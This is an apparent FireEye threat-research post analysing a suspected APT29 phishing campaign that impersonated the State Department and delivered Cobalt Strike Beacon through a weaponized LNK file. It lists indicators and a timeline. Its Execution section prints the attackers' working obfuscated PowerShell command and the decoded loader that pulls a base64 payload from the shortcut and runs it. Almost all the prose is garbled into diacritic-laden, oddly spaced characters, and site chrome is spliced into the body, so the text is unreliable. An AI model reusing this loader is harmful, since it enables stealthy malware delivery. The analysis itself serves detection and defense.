{
    "title": "not so cozy_ an uncomfortable examination of a suspected apt29 phishing campaign _ fireeye inc",
    "text": "Țħřěǻț Řěșěǻřčħ\nŇǿț Șǿ Čǿ żỳ: Ǻň Ųňčǿmfǿ řțǻbŀě Ěxǻmįňǻțįǿň ǿf ǻ\nȘųșpěčțěđ ǺPȚ29 Pħįșħįňģ Čǻmpǻįģň\nŇǿvěmbě ř 19, 2018  | bỳ Mǻțțħěẅ Đųňẅǿǿđỳ, Ǻňđřěẅ Țħǿmp șǿň, Běň Ẅįțħňěŀŀ , Jǿňǻțħǻň Ŀěǻțħě řỳ, Mįčħǻěŀ\nMǻțǿňįș, Ňįčķ Čǻřř\nȘPĚǺŘ PĦİȘĦİŇĢ \nPĦİȘĦİŇĢ \nǺPȚ\nİňțřǿđųčțįǿň\nFįřěĚỳě đěvįčěș đěțěčțěđ įňțřųșįǿň ǻțțěmpț ș ǻģǻįňșț mųŀțįpŀě įňđųșțřįěș, įňčŀųđįňģ țħįňķ țǻňķ, ŀǻ ẅ\něňfǿřčěměňț, mě đįǻ, Ų.Ș. mįŀįțǻ řỳ, įmǻģě řỳ, țřǻňșpǿřțǻțįǿň, pħǻ řmǻčěųțįčǻŀ, ňǻțįǿňǻŀ ģǿvě řňměňț, ǻň đ\nđěfěňșě čǿňțřǻčțįňģ.\nȚħě ǻțțěmpț ș įňvǿŀvě đ ǻ pħįșħįňģ ěmǻįŀ ǻppěǻ řįňģ țǿ bě f řǿm țħě Ų.Ș. Đěpǻ řțměňț ǿf Șțǻțě ẅįțħ ŀįňķș țǿ żįp\nfįŀěș čǿňțǻįňįňģ mǻŀįčįǿ ųș Ẅįňđǿẅș șħǿřțčųțș țħǻț đěŀįvěřěđ Čǿbǻŀț Șț řįķě Běǻčǿň.\nȘħǻřěđ țěčħňįčǻŀ ǻ řțįfǻčțș; țǻčțįčș, țěčħňįq ųěș, ǻňđ přǿčěđųřěș (ȚȚPș); ǻňđ țǻřģěțįňģ čǿňňěčț țħį ș ǻčțįvįțỳ țǿ\npřěvįǿųșŀỳ ǿbșěřvěđ ǻčțįvįțỳ șųșpěčțěđ țǿ bě ǺPȚ 29.\nǺPȚ29 įș ķňǿẅň țǿ țřǻňșįțįǿň ǻẅǻỳ fřǿm pħįșħįňģ įmpŀǻňț ș ẅįțħįň ħǿ ųřș ǿf įňįțįǻŀ čǿmp řǿmįșě.\nǾň Ňǿvěmbě ř 14, 2018 , FįřěĚỳě đěțěčțěđ ňěẅ țǻřģěțěđ pħįșħįňģ ǻčțįvįțỳ ǻț mǿ řě țħǻň 20 ǿf ǿųř čŀįěňțș ǻčřǿșș\nmųŀțįpŀě įňđųșțřįěș.\nȚħě ǻțțǻčķě ř ǻppěǻřș țǿ ħǻvě čǿmp řǿmįșěđ țħě ěmǻįŀ șěřvěř ǿf ǻ ħǿ șpįțǻŀ ǻň đ țħě čǿřpǿřǻțě ẅěbșįțě ǿf ǻ\nčǿňșųŀțįňģ čǿmpǻňỳ įň ǿ řđěř țǿ ųșě țħěįř įňfřǻșțřųčțųřě țǿ șěňđ pħįșħįňģ ěmǻįŀ ș. Țħě pħį șħįňģ ěmǻįŀ ș ẅěřě mǻđě\nțǿ ŀǿǿķ ŀįķě șěčųřě čǿmm ųňįčǻțįǿň f řǿm ǻ P ųbŀįč Ǻffǻį řș ǿffįčįǻŀ ǻț țħě Ų.Ș. Đěpǻ řțměňț ǿf Șțǻțě, ħǿ șțěđ ǿň ǻ pǻģě\nmǻđě țǿ ŀǿǿķ ŀįķě ǻňǿțħě ř Đěpǻřțměňț ǿf Șțǻțě P ųbŀįč Ǻffǻį řș ǿffįčįǻŀ' ș pěřșǿňǻŀ đřįvě, ǻňđ ųșěđ ǻ ŀěģįțįmǻțě\nĐěpǻřțměňț ǿf Șțǻțě fǿ řm ǻș ǻ đěčǿỳ. Țħį ș įňfǿřmǻțįǿň čǿ ųŀđ bě ǿbțǻįňě đ vįǻ pųbŀįčŀỳ ǻvǻįŀǻbŀě đǻțǻ, ǻňđ țħěřě\nįș ňǿ įňđįčǻțįǿň țħǻț țħě Đěpǻ řțměňț ǿf Șțǻțě ňěț ẅǿřķ ẅǻș įňvǿŀvě đ įň țħįș čǻmpǻįģň. Țħě ǻțțǻčķě ř ųșěđ ųňįqųě\nŀįňķș įň ěǻčħ pħį șħįňģ ěmǻįŀ ǻň đ țħě ŀįňķ ș țħǻț Fį řěĚỳě ǿbșěřvěđ ẅěřě ųșěđ țǿ đǿẅňŀǿǻđ ǻ ŻİP ǻřčħįvě țħǻț\nčǿňțǻįňě đ ǻ ẅěǻpǿňįżěđ Ẅįňđǿẅș șħǿřțčųț fįŀě, ŀǻųňčħįňģ bǿțħ ǻ běňįģň đěčǿỳ đǿčųměňț ǻň đ ǻ Čǿbǻŀț Șț řįķě\nBěǻčǿň bǻčķ đǿǿř, čųșțǿmįżěđ bỳ țħě ǻțțǻčķě ř țǿ bŀěň đ įň ẅįțħ ŀěģįțįmǻțě ňěț ẅǿřķ țřǻffįč.\nȘěvěřǻŀ ěŀěměňț ș fřǿm țħįș čǻmpǻįģň – įňčŀ ųđįňģ țħě řěșǿųřčěș įňvěșțěđ įň țħě pħį șħįňģ ěmǻįŀ ǻň đ ňěțẅǿřķ\nįňfřǻșțřųčțųřě, țħě měțǻ đǻțǻ fřǿm țħě ẅěǻpǿňįżěđ șħǿřțčųț fįŀě pǻỳŀǿǻ đ, ǻňđ țħě șpěčįfįč vįčțįm įň đįvįđųǻŀș ǻňđ\nǿřģǻňįżǻțįǿňș țǻřģěțěđ – ǻřě đįřěčțŀỳ ŀįňķě đ țǿ țħě ŀǻ șț ǿbșěřvěđ ǺPȚ29 pħįșħįňģ čǻmpǻįģň f řǿm Ňǿvěmbě ř\n2016 . Țħįș bŀǿģ pǿ șț ěxpŀǿřěș țħǿșě țěčħňįčǻŀ b řěǻđčřųmbș ǻňđ țħě pǿ șșįbŀě įňțěňțįǿň ș ǿf țħįș ǻčțįvįțỳ.\nǺțțřįbųțįǿň Čħǻŀŀěňģě ș\nČǿňčŀųșįvě FįřěĚỳě ǻțțřįbųțįǿň įș ǿfțěň ǿbțǻįňě đ țħřǿųģħ ǿųř Mǻňđįǻňț čǿň șųŀțįňģ țěǻm' ș įňvěșțįģǻțįǿň ǿf\nįňčįđěňțș ǻț čǿmp řǿmįșěđ ǿřģǻňįżǻțįǿňș, țǿ įđěňțįfỳ đěțǻįŀș ǿf țħě ǻțțǻčķ ǻň đ pǿșț-čǿmp řǿmįșě ǻčțįvįțỳ ǻț vįčțįm ș.\nFįřěĚỳě įș șțįŀŀ ǻňǻŀỳ żįňģ țħįș ǻčțįvįțỳ.\nȚħěřě ǻřě șěvěřǻŀ șįmįŀǻřįțįěș ǻňđ țěčħňįčǻŀ ǿvě řŀǻpș běțẅěěň țħě 14 Ňǿvěmbě ř 2018 , pħįșħįňģ čǻmpǻįģň ǻň đ țħě\nșųșpěčțěđ ǺPȚ29 pħįșħįňģ čǻmpǻįģň ǿň 9 Ňǿvěmbě ř 2016 , bǿțħ ǿf ẅħįčħ ǿčč ųřřěđ șħǿřțŀỳ ǻfțěř Ų.Ș. ěŀěčțįǿň ș.\nĦǿẅěvěř, țħě ňě ẅ čǻmpǻįģň įňčŀ ųđěđ čřěǻțįvě ňě ẅ ěŀěměňț ș ǻș ẅěŀŀ ǻș ǻ șěěmįňģŀỳ đěŀįběřǻțě řěųșě ǿf ǿŀđ\npħįșħįňģ țǻčțįč ș, țěčħňįq ųěș ǻňđ přǿčěđųřěș (ȚȚPș), įňčŀųđįňģ ųșįňģ țħě șǻmě șỳșțěm țǿ ẅěǻpǿňįżě ǻ Ẅįň đǿẅș\nșħǿřțčųț (ĿŇĶ) fįŀě. ǺPȚ 29 įș ǻ șǿpħįșțįčǻțěđ ǻčțǿř, ǻňđ ẅħįŀě șǿpħįșțįčǻțěđ ǻčțǿřș ǻřě ňǿț įňfǻŀŀįbŀě, șěěmįňģŀỳ\nbŀǻțǻňț mį șțǻķěș ǻřě čǻųșě fǿř pǻųșě ẅħěň čǿň șįđěřįňģ ħįșțǿřįčǻŀ ųșěș ǿf đěčěpțįǿň bỳ Ř ųșșįǻň įňțěŀŀįģěňčě\nșěřvįčěș. İț ħǻș ǻŀșǿ běěň ǿvě ř ǻ ỳěǻř șįňčě ẅě ħǻvě čǿňčŀ ųșįvěŀỳ įđěňțįfįěđ ǺPȚ29 ǻčțįvįțỳ, ẅħįčħ řǻįșěș qųěșțįǿňș\nǻbǿųț țħě țįmįňģ ǻň đ țħě șįmįŀǻřįțįěș ǿf țħě ǻčțįvįțỳ ǻfțě ř șųčħ ǻ ŀǿňģ įňțě řŀųđě.\nŇǿțǻbŀě șįmįŀǻřįțįěș běțẅěěň țħįș ǻňđ țħě 2016  čǻmpǻįģň įňčŀ ųđě țħě Ẅįň đǿẅș șħǿřțčųț měțǻđǻțǻ, țǻřģěțěđ\nǿřģǻňįżǻțįǿňș ǻňđ șpěčįfįč įň đįvįđųǻŀș, pħįșħįňģ ěmǻįŀ čǿň șțřųčțįǿň, ǻň đ țħě ųșě ǿf čǿmp řǿmįșěđ įňfřǻșțřųčțųřě.\nŇǿțǻbŀě đįffěřěňčěș įňčŀųđě țħě ųșě ǿf Čǿbǻŀț Șț řįķě, řǻțħěř țħǻň čųșțǿm mǻŀ ẅǻřě; ħǿẅěvěř, mǻňỳ ě șpįǿňǻģě\nǻčțǿřș đǿ ųșě pųbŀįčŀỳ ǻň đ čǿmmě řčįǻŀŀỳ ǻvǻįŀǻbŀě f řǻměẅǿřķș fǿř řěǻșǿňș șųčħ ǻș pŀǻųșįbŀě đěňįǻbįŀįțỳ.\nĐųřįňģ țħě pħį șħįňģ čǻmpǻįģň, țħě řě ẅěřě įňđįčǻțįǿňș țħǻț țħě șįțě ħǿșțįňģ țħě mǻŀ ẅǻřě ẅǻș șěŀěčțįvěŀỳ șěřvįňģ\npǻỳŀǿǻđș. Fǿř ěxǻmpŀě, řěqųěșțș ųșįňģ įňčǿ řřěčț ĦȚȚP ħěǻ đěřș řěpǿřțěđŀỳ șěřvěđ ŻİP ǻřčħįvěș čǿňțǻįňįňģ ǿňŀỳ\nțħě běňįģň p ųbŀįčŀỳ ǻvǻįŀǻbŀě Đěpǻ řțměňț ǿf Șțǻțě fǿ řm. İț įș pǿșșįbŀě țħǻț țħě țħ řěǻț ǻčțǿ ř șěřvěđ ǻđđįțįǿňǻŀ ǻň đ\nđįffěřěňț pǻỳŀǿǻ đș đěpěňđįňģ ǿň țħě ŀįňķ vį șįțěđ; ħǿẅěvěř, FįřěĚỳě ħǻș ǿňŀỳ ǿb șěřvěđ țẅǿ: țħě běňįģň ǻň đ\nČǿbǻŀț Șț řįķě vǻřįǻțįǿňș.\nẄě přǿvįđě đěțǻįŀș ǿf țħįș įň țħě ǻčțįvįțỳ șųmmǻřỳ. Ǻňǻŀỳ șįș ǿf țħě čǻmpǻįģň į ș ǿňģǿįňģ, ǻň đ ẅě ẅěŀčǿmě ǻňỳ\nǻđđįțįǿňǻŀ įňfǿ řmǻțįǿň f řǿm țħě čǿmm ųňįțỳ.\nǺčțįvįțỳ Ș ųmmǻřỳ\nȚħě țħřěǻț ǻčțǿ ř čřǻfțěđ țħě pħį șħįňģ ěmǻįŀ ș țǿ mǻșqųěřǻđě ǻș ǻ Ų.Ș. Đěpǻ řțměňț ǿf Șțǻțě P ųbŀįč Ǻffǻį řș ǿffįčįǻŀ\nșħǻřįňģ ǻň ǿffįčįǻŀ đǿčųměňț. Țħě ŀįňķ ș ŀěđ țǿ ǻ ŻİP ǻřčħįvě țħǻț čǿňțǻįňě đ ǻ ẅěǻpǿňįżěđ Ẅįňđǿẅș șħǿřțčųț fįŀě\nħǿșțěđ ǿň ǻ ŀįķěŀỳ čǿmp řǿmįșěđ ŀěģįțįmǻțě đǿmǻįň, jmj[.].čǿm. Țħě șħǿřțčųț fįŀě ẅǻș čřǻfțěđ țǿ ěxěč ųțě ǻ\nPǿẅěřȘħěŀŀ čǿmmǻň đ țħǻț řěǻđ, đěčǿđěđ, ǻňđ ěxěčųțěđ ǻđđįțįǿňǻŀ čǿ đě fřǿm ẅįțħįň țħě șħǿřțčųț fįŀě.\nŲpǿň ěxěč ųțįǿň, țħě șħǿřțčųț fįŀě đřǿppěđ ǻ běňįģň, p ųbŀįčŀỳ ǻvǻįŀǻbŀě, Ų.Ș. Đěpǻ řțměňț ǿf Șțǻțě fǿ řm ǻňđ Čǿbǻŀț\nȘțřįķě Běǻčǿň. Čǿbǻŀț Șț řįķě įș ǻ čǿmmě řčįǻŀŀỳ ǻvǻįŀǻbŀě pǿ șț-ěxpŀǿįțǻțįǿň f řǻměẅǿřķ. Țħě B ĚǺČǾŇ pǻỳŀǿǻ đ ẅǻș\nčǿňfįģųřěđ ẅįțħ ǻ mǿ đįfįěđ vǻřįǻțįǿň ǿf țħě p ųbŀįčŀỳ ǻvǻįŀǻbŀě \"Pǻňđǿřǻ\" Mǻŀŀěǻbŀě Č 2 Přǿfįŀě ǻňđ ųșěđ ǻ\nčǿmmǻň đ ǻňđ čǿňțřǿŀ (Č2) đǿmǻįň – pǻň đǿřǻșǿňģ[.]čǿm – ǻ șșěșșěđ țǿ bě ǻ mǻ șqųěřǻđě ǿf țħě Pǻň đǿřǻ mųșįč\nșțřěǻmįňģ șěřvįčě. Țħě č ųșțǿmįżǻțįǿň ǿf țħě Č 2 přǿfįŀě mǻỳ ħǻvě běěň įňțěň đěđ țǿ đěfěǻț ŀě șș řěșįŀįěňț ňěț ẅǿřķ\nđěțěčțįǿň měțħǿ đș đěpěňđěňț ǿň țħě đěfǻųŀț čǿňfįģ ųřǻțįǿňș. Țħě șħǿřțčųț měțǻđǻțǻ įňđįčǻțěș įț ẅǻș bųįŀț ǿň țħě\nșǻmě ǿř věřỳ șįmįŀǻř șỳșțěm ǻș țħě șħǿřțčųț ųșěđ įň țħě Ňǿvěmbě ř 2016  čǻmpǻįģň. Țħě đěčǿỳ čǿňțěňț į ș șħǿẅň\nįň Fįģųřě 1.\nFįģųřě 1: Đěčǿỳ đǿčųměňț čǿňțěňț\nȘįmįŀǻřįțįěș țǿ Ǿŀđěř Ǻčțįvįțỳ \nĚmǻįŀ Ųp đǻțěș\nİňfǿřmǻțįǿň ǻň đ įňșįģħț ǿň țǿ đǻỳ'ș\nǻđvǻňčěđ țħřěǻțș fřǿm FįřěĚỳě.\nȘĦǺŘĚ\nŘěčěňț Pǿ șțș\n09 Mǻř 2020\n24 Fěb 2020\n20 Fěb 2020\nŘȘȘ FĚĚĐ: ȘȚǺỲ ČǾ ŇŇĚČȚĚĐFįřșț Ňǻmě Ŀǻșț Ňǻmě\nĚmǻįŀ Ǻđđřěșș\nČǿmpǻňỳ Ňǻmě\nȚħřěǻț Řěșěǻřčħ Bŀǿģ\nFįřěĚỳě Șțǿřįěș Bŀǿģ\nİňđųșțřỳ Pěřșpěčțįvě ș Bŀǿģ\nỲěș, İ ẅǿųŀđ ŀįķě țǿ řěčěįvě\nčǿmmųňįčǻțįǿň ș fřǿm FįřěĚỳě.\nPŀěǻșě řěǻđ mǿřě ǻbǿųț ǿųř\nįňfǿřmǻțįǿň čǿŀŀěčțįǿň ǻň đ ųșě.\nȘŲBȘČŘ İBĚ\nČřěșčěňđǿ: Řěǻŀ Țįmě Ěvěňț Vįě ẅěř\nfǿř mǻčǾȘ  \nŘǻňșǿmẅǻřě Ǻģǻįň șț țħě Mǻčħįňě:\nĦǿẅ Ǻđvěřșǻřįěș ǻřě Ŀěǻřňįňģ țǿ\nĐįșřųpț İňđųșțřįǻŀ Přǿđųčțįǿň bỳ\nȚǻřģěțįňģ İȚ ǻňđ ǾȚ \nM-Țřěňđș 2020 : İňșįģħțș Fřǿm țħě\nFřǿňț Ŀįňě ș \n\nĦǿmě  FįřěĚỳě Bŀǿģ ș Țħřěǻț Řěșěǻřčħ  Ňǿț Șǿ Čǿ żỳ: Ǻň Ųňčǿmfǿ řțǻbŀě Ěxǻmįňǻțįǿň ǿf ǻ Ș ųș...   \nȘǿŀųțįǿňș Șěřvįčěș Čųșțǿměřș Pǻřțňěřș Řěșǿųřčěș Čǿmpǻňỳ\n Țħįș ǻčțįvįțỳ ħǻ ș ȚȚP ǻň đ țǻřģěțįňģ ǿvě řŀǻp ẅįțħ přěvįǿųș ǻčțįvįțỳ, șųșpěčțěđ țǿ bě ǺPȚ 29. Țħě mǻŀįčįǿ ųș ĿŇĶ\nųșěđ įň țħě řěčěňț șpěǻřpħįșħįňģ čǻmpǻįģň, ds7002.lnk  (MĐ5: 6ěđ0020 b0851 fb71đ5b0076f4ěě95f3č), ħǻș\nțěčħňįčǻŀ ǿvě řŀǻpș ẅįțħ ǻ șųșpěčțěđ ǺPȚ29 ĿŇĶ fřǿm Ňǿvěmbě ř 2016 , 37486-the-shocking-truth-about-\nelection-rigging-in-america.rtf.lnk  (MĐ5: f713đ5đ f826č6051 ě65f995ě57đ681 7đ), ẅħįčħ ẅǻș pųbŀįčŀỳ řěpǿřțěđ\nbỳ Vǿŀěxįțỳ . Țħě 2018  ǻňđ 2016  ĿŇĶ fįŀěș ǻřě șįmįŀǻř įň șțřųčțųřě ǻňđ čǿđě, ǻňđ čǿňțǻįň șįģňįfįčǻňț měțǻ đǻțǻ\nǿvěřŀǻp, įňčŀ ųđįňģ țħě MǺČ ǻ đđřěșș ǿf țħě șỳșțěm ǿň ẅħįčħ țħě Ŀ ŇĶ ẅǻș čřěǻțěđ.\nǺđđįțįǿňǻŀ ǿvě řŀǻp ẅǻș ǿbșěřvěđ įň țħě țǻ řģěțįňģ ǻň đ țǻčțįčș ěmpŀǿỳě đ įň țħě pħį șħįňģ čǻmpǻįģň ș řěșpǿňșįbŀě\nfǿř đįșțřįbųțįňģ țħě șě ĿŇĶ fįŀě. P řěvįǿųș ǺPȚ29 ǻčțįvįțỳ țǻ řģěțěđ șǿmě ǿf țħě șǻmě řěčįpįěňț ș ǿf țħįș ěmǻįŀ\nčǻmpǻįģň, ǻň đ ǺPȚ29 ħǻș ŀěvěřǻģěđ ŀǻřģě ẅǻvěș ǿf ěmǻįŀ ș įň přěvįǿųș čǻmpǻįģň ș.\nǾųțŀǿǿķ ǻň đ İmpŀįčǻțįǿň ș\nǺňǻŀỳșįș ǿf țħįș ǻčțįvįțỳ į ș ǿňģǿįňģ, b ųț įf țħě ǺPȚ 29 ǻțțřįbųțįǿň įș șțřěňģțħěňě đ, įț ẅǿųŀđ bě țħě fį řșț ǻčțįvįțỳ\nųňčǿvěřěđ fřǿm țħįș șǿpħįșțįčǻțěđ ģřǿųp įň ǻț ŀěǻ șț ǻ ỳěǻř. Ģįvěň țħě ẅįđěșpřěǻđ ňǻțųřě ǿf țħě țǻ řģěțįňģ,\nǿřģǻňįżǻțįǿňș țħǻț ħǻvě p řěvįǿųșŀỳ běěň țǻ řģěțěđ bỳ ǺPȚ 29 șħǿųŀđ țǻķě ňǿțě ǿf țħį ș ǻčțįvįțỳ. Fǿ ř ňěțẅǿřķ\nđěfěňđěřș, ẅħěțħěř ǿř ňǿț țħį ș ǻčțįvįțỳ ẅǻș čǿňđųčțěđ bỳ ǺPȚ 29 șħǿųŀđ bě șěčǿňđǻřỳ țǿ přǿpěřŀỳ įňvěșțįģǻțįňģ\nțħě fųŀŀ șčǿpě ǿf țħě įňț řųșįǿň, ẅħįčħ įș ǿf čřįțįčǻŀ įmpǿ řțǻňčě įf țħě ěŀ ųșįvě ǻňđ đěčěpțįvě ǺPȚ 29 ǿpěřǻțǿřș įňđěěđ\nħǻđ ǻččěșș țǿ ỳǿųř ěňvįřǿňměňț.  \nȚěčħňįčǻŀ Đěțǻįŀ ș\nPħįșħįňģ\nĚmǻįŀș ẅěřě șěňț fřǿm DOSOneDriveNotifications-svCT-\nMailboxe36625aaa85747214aa50342836a2315aaa36928202aa46271691a8255aaa15382822aa25821925a0245@northshorehealthgm[.]org\nẅįțħ țħě șųbjěčț Stevenson, Susan N shared \"TP18-DS7002 (UNCLASSIFIED)\" with you . Țħě đįșțřįbųțįǿň ǿf ěmǻįŀ ș\nvǻřįěđ șįģňįfįčǻňțŀỳ běț ẅěěň țħě ǻffěčțě đ ǿřģǻňįżǻțįǿňș. Ẅħįŀě mǿ șț țǻřģěțěđ FįřěĚỳě čųșțǿměřș řěčěįvěđ țħřěě\nǿř fěẅěř ěmǻįŀș, șǿmě řěčěįvěđ șįģňįfįčǻňțŀỳ mǿ řě, ẅįțħ ǿňě č ųșțǿměř řěčěįvįňģ 136.\nĚǻčħ pħį șħįňģ ěmǻįŀ čǿňțǻįňě đ ǻ ųňįqųě mǻŀįčįǿ ųș ŲŘĿ, ŀįķěŀỳ fǿ ř țřǻčķįňģ vįčțįm čŀįčķ ș. Țħě pǻțțě řň ǿf țħįș ŲŘĿ įș\nșħǿẅň įň Fįģ ųřě 2.\nFįģųřě 2: Mǻŀįčįǿ ųș ŲŘĿ șțřųčțųřě\nǾųțșįđě ǿf țħě ŀěňģțħ ǿf țħě șěňđěř ěmǻįŀ ǻ đđřěșș, ẅħįčħ mǻỳ ħǻvě běěň ț řųňčǻțěđ ǿň șǿmě řěčįpįěňț ěmǻįŀ\nčŀįěňțș, țħě ǻțțǻčķě ř mǻđě ŀįțțŀě ěffǿ řț țǿ ħįđě țħě țřųě șǿųřčě ǿf țħě ěmǻįŀ ș, įňčŀųđįňģ țħǻț țħěỳ ẅěřě ňǿț ǻčț ųǻŀŀỳ\nșěňț fřǿm țħě Đěpǻ řțměňț ǿf Șțǻțě. Fįģ ųřě 3 přǿvįđěș ǻ řěđǻčțěđ șňǻpșħǿț ǿf ěmǻįŀ ħěǻ đěřș fřǿm țħě pħį șħįňģ\nměșșǻģě.\nFįģųřě 3: Řěđǻčțěđ ěmǻįŀ ħěǻ đěřș\nȚħě mǻŀįčįǿ ųș ŀįňķș ǻřě ķňǿẅň țǿ ħǻvě șěřvěđ țẅǿ vǻřįǻňțș ǿf țħě fįŀě ds7002.zip . Țħě fįřșț vǻřįǻňț (MĐ 5:\n3fččf531ff0ǻě6fěđđ7č586774b17ǻ2đ), čǿňțǻįňě đ ds7002.lnk  (MĐ5: 6ěđ0020 b0851 fb71đ5b0076f4ěě95f3č).\nds7002.lnk  ẅǻș ǻ mǻŀįčįǿ ųș șħǿřțčųț (ĿŇĶ) fįŀě țħǻț čǿňțǻįňě đ ǻň ěmbě đđěđ BĚǺČǾŇ ĐĿĿ ǻň đ đěčǿỳ PĐF, ǻň đ\nẅǻș čřǻfțěđ țǿ ŀǻųňčħ ǻ Pǿ ẅěřȘħěŀŀ čǿmmǻň đ. Ǿň ěxěč ųțįǿň, țħě Pǿ ẅěřȘħěŀŀ čǿmmǻň đ ěxțřǻčțěđ ǻňđ ěxěčųțěđ\nțħě Čǿbǻŀț Șț řįķě BĚǺČǾŇ bǻčķđǿǿř ǻňđ đěčǿỳ PĐF. Țħě ǿțħě ř ǿbșěřvěđ vǻřįǻňț ǿf đș7002.żįp (MĐ5:\n658č6fě38f95995 fǻ8đč8f6čfě41đf7b) čǿňțǻįňě đ ǿňŀỳ țħě běňįģň đěčǿỳ đǿčųměňț. Țħě đěčǿỳ đǿčųměňț\nds7002.pdf  (MĐ5: 313f4808ǻǻ2ǻ2073005đ219 bč68971čđ) ǻppěǻ řș țǿ ħǻvě běěň đǿẅňŀǿǻđěđ fřǿm\nħxxpș://ěfǿřmș.șțǻțě.ģǿv/Fǿ řmș/đș7002.PĐF.\nȚħě BĚǺČǾŇ bǻčķđǿǿř čǿmmųňįčǻțěđ ẅįțħ țħě Č 2 đǿmǻįň pandorasong[.]com (95.216.59[.]92) . Țħě đǿmǻįň\nŀěvěřǻģěđ přįvǻčỳ p řǿțěčțįǿň, b ųț ħǻđ ǻ șțǻřț ǿf ǻųțħǿřįțỳ (ȘǾǺ) řěčǿřđ čǿňțǻįňįňģ vleger@tutanota.com .\nǾųř ǻňǻŀỳșįș įňđįčǻțěș țħǻț țħě ǻțțǻčķě ř șțǻřțěđ čǿňfįģųřįňģ įňfřǻșțřųčțųřě ǻppřǿxįmǻțěŀỳ 30 đǻỳș přįǿř țǿ țħě\nǻțțǻčķ. Țħį ș įș ǻ șįģňįfįčǻňțŀỳ ŀǿňģě ř đěŀǻỳ țħǻň mǻňỳ ǿțħě ř ǻțțǻčķě řș ẅě țřǻčķ. Țǻbŀě 1 čǿňțǻįň ș ǻ țįměŀįňě ǿf țħį ș\nǻčțįvįțỳ.\nȚįmě Ěvěňț Șǿųřčě\n2018 -10-15 15:35:19Żpǻňđǿřǻșǿňģ[.]čǿm řěģįșțěřěđ Řěģįșțřǻňț İňfǿřmǻțįǿň\n2018 -10-15\n17:39:00Żpǻňđǿřǻșǿňģ[.]čǿm ȘȘĿ čě řțįfįčǻțě\něșțǻbŀįșħěđČěřțįfįčǻțě Ț řǻňșpǻřěňčỳ\n2018 -10-15\n18:52:06ŻČǿbǻŀț Șț řįķě șěřvěř ěșțǻbŀįșħěđ Șčǻň Đǻțǻ\n2018 -11-02\n10:25:58ŻĿŇĶ Ẅěǻpǿňį żěđ ĿŇĶ Měțǻ đǻțǻ\n2018 -11-13 17:58:41Ż3fččf531ff0ǻě6fěđđ7č586774b17ǻ2đ\nmǿđįfįěđǺřčħįvě Měțǻ đǻțǻ\n2018 -11-14\n01:48:34Ż658č6fě38f95995 fǻ8đč8f6čfě41đf7b\nmǿđįfįěđǺřčħįvě Měțǻ đǻțǻ\n2018 -11-14\n08:23:10ŻFįřșț ǿbșěřvěđ pħįșħįňģ ě-mǻįŀ șěňț Țěŀěměț řỳ\nȚǻbŀě 1: Ǿpěřǻțįǿňǻŀ țįměŀįňě\nĚxěčųțįǿň\nŲpǿň ěxěč ųțįǿň ǿf țħě mǻŀįčįǿ ųș ĿŇĶ, ds7002.lnk  (MĐ5: 6ěđ0020 b0851 fb71đ5b0076f4ěě95f3č), țħě fǿŀŀǿ ẅįňģ\nPǿẅěřȘħěŀŀ čǿmmǻň đ ẅǻș ěxěčųțěđ:\n\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noni -ep bypass\n$zk='JHB0Z3Q9MHgwMDA1ZTJiZTskdmNxPTB4MDAwNjIzYjY7JHRiPSJkczcwMDIubG5\nrIjtpZiAoLW5vdChUZXN0LVBhdGggJHRiKSl7JG9lPUdldC1DaGlsZEl0ZW0gLVBhdGggJE\nVudjp0ZW1wIC1GaWx0ZXIgJHRiIC1SZWN1cnNlO2lmICgtbm90ICRvZSkge2V4aXR9W\n0lPLkRpcmVjdG9yeV06OlNldEN1cnJlbnREaXJlY3RvcnkoJG9lLkRpcmVjdG9yeU5hbWUp\nO30kdnp2aT1OZXctT2JqZWN0IElPLkZpbGVTdHJlYW0gJHRiLCdPcGVuJywnUmVhZCcsJ\n1JlYWRXcml0ZSc7JG9lPU5ldy1PYmplY3QgYnl0ZVtdKCR2Y3EtJHB0Z3QpOyRyPSR2en\nZpLlNlZWsoJHB0Z3QsW0lPLlNlZWtPcmlnaW5dOjpCZWdpbik7JHI9JHZ6dmkuUmVhZC\ngkb2UsMCwkdmNxLSRwdGd0KTskb2U9W0NvbnZlcnRdOjpGcm9tQmFzZTY0Q2hhckFy\ncmF5KCRvZSwwLCRvZS5MZW5ndGgpOyR6az1bVGV4dC5FbmNvZGluZ106OkFTQ0lJL\nkdldFN0cmluZygkb2UpO2lleCAkems7';$fz='FromBase'+0x40+'String';$rhia=[Text.E\nncoding]::ASCII.GetString([Convert]::$fz.Invoke($zk));iex $rhia;\nȚħįș čǿmmǻň đ įňčŀųđěđ șǿmě șpěčįfįč ǿbf ųșčǻțįǿň, ẅħįčħ mǻỳ įň đįčǻțě ǻțțěmpț ș țǿ bỳpǻ șș șpěčįfįč đěțěčțįǿň\nŀǿģįč. Fǿ ř ěxǻmpŀě, țħě ųșě ǿf 'FromBase'+0x40+'String' , įň pŀǻčě ǿf F řǿmBǻșě64Șțřįňģ, țħě Pǿ ẅěřȘħěŀŀ\nčǿmmǻň đ ųșěđ țǿ đěčǿđě bǻșě64.\nȚħě đěčǿđěđ čǿmmǻň đ čǿňșįșțěđ ǿf ǻđđįțįǿňǻŀ Pǿ ẅěřȘħěŀŀ țħǻț řěǻđ țħě čǿňțěňț ǿf ds7002.lnk  fřǿm ǿffșěț\n0x5e2be  țǿ ǿffșěț 0x623b6 , bǻșě64 đěčǿđěđ țħě ěxț řǻčțěđ čǿňțěňț, ǻň đ ěxěčųțěđ įț ǻș ǻđđįțįǿňǻŀ Pǿ ẅěřȘħěŀŀ\nčǿňțěňț. Țħě ěmbě đđěđ PǿẅěřȘħěŀŀ čǿ đě đěčǿđěđ țǿ țħě fǿŀŀǿ ẅįňģ:\n$ptgt=0x0005e2be;\n $vcq=0x000623b6;\n$tb=\"ds7002.lnk\";\nif (-not(Test-Path $tb))\n{\n$oe=Get-ChildItem -Path $Env:temp -Filter $tb -Recurse;\nif (-not $oe)\n{\n   exit\n}\n[IO.Directory]::SetCurrentDirectory($oe.DirectoryName);\n}\n$vzvi=New-Object IO.FileStream $tb,'Open','Read','ReadWrite';\n$oe=New-Object byte[]($vcq-$ptgt);\n$r=$vzvi.Seek($ptgt,[IO.SeekOrigin]::Begin);\n$r=$vzvi.Read($oe,0,$vcq-$ptgt);\n$oe=[Convert]::FromBase64CharArray($oe,0,$oe.Length);\n$zk=[Text.Encoding]::ASCII.GetString($oe);\niex $zk;\nẄħěň țħě đěčǿđěđ PǿẅěřȘħěŀŀ įș čǿmpǻ řěđ țǿ țħě ǿŀ đěř 2016  PǿẅěřȘħěŀŀ ěmbě đđěđ ŀǿǻđěř (Fįģųřě 4), įț'ș čŀěǻř\nțħǻț șįmįŀǻřįțįěș 